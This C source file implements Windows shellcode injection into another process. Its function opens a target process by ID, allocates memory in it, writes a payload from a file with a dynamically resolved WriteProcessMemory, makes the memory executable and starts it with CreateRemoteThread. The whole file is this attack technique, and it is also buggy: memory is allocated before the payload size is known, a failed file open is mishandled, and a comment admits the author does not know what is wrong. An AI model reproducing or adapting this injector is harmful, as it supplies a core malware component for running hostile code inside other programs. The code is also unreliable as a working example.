#include "crt.h"
#include "logger.h"
#include "mem.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#endif
#include <stdlib.h>
#include <stdio.h>

// TODO: I have no idea what's wrong haha
typedef WINBOOL (WINAPI * fWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
fWriteProcessMemory pWriteProcessMemory;

char* ExtractBytesFromFile(const char* f, size_t* size)
{
    FILE* fp = NULL;

    if ( !(fp = fopen(f, "rb")) )
    {
        fclose(fp);
    }
    fseek(fp, 0, SEEK_END);
    *size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char* bytesRead = (char *)malloc(*size);
    fread(bytesRead, *size, sizeof(char), fp); 

    return bytesRead;
}

int InjectExecuteShellcode(Resource* pResource, Injector* pInjector)
{
    DWORD old_protect = 0;
    BOOL bSuccess     = 0;
    char* payload     = 0;
    size_t size       = 0;

    HANDLE hProcess   = NULL;
    HANDLE hThread    = NULL;
    void* exec_mem    = NULL;

    LogEvent(pInjector, "Opening target process..", 0);
    if (!(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pResource->process_id)))
    {
        LogEvent(pInjector, "Failed to acquire handle to target", 0);
        CloseHandle(hProcess);
        return -1;
    }
    LogEvent(pInjector, "Process Handle to target acquired", 0);

    LogEvent(pInjector, "Allocating virtual memory to target..", 0);
    if (!(exec_mem = VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        LogEvent(pInjector, "Failed to allocate memory to target", 0);
        CloseHandle(hProcess);
        return -1;
    }
    LogEvent(pInjector, "Allocation successful", 0);

    /*WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL);*/
    LogEvent(pInjector, "Writing payload to executable memory..", 0);
    payload = ExtractBytesFromFile(pResource->dll_rel_path, &size);
    pWriteProcessMemory = (fWriteProcessMemory)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory");
    if (!(pWriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
    {
        LogEvent(pInjector, "Failed to write payload to executable memory", 0);
        return -1;
    }
    LogEvent(pInjector, "Write success", 0);

    LogEvent(pInjector, "Changing virtual protection permissions..", 0);
    if (!(bSuccess = VirtualProtectEx(hProcess, exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
    {
        LogEvent(pInjector, "Failed to change virtual protection permissions", 0);
        return -1;
    }
    LogEvent(pInjector, "Protect changed", 0);

    LogEvent(pInjector, "Creating remote thread..", 0);
    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
    {
        LogEvent(pInjector, "Failed to create remote thread", 0);
        return -1;
    }
    LogEvent(pInjector, "Remote thread created", 0);
    
    // optional wait for object
    // WaitForSingleObject(hThread, INFINITE);
    
    LogEvent(pInjector, "Closing handle and returning control to owner..", 0);
    CloseHandle(hProcess);
    return 0;
}
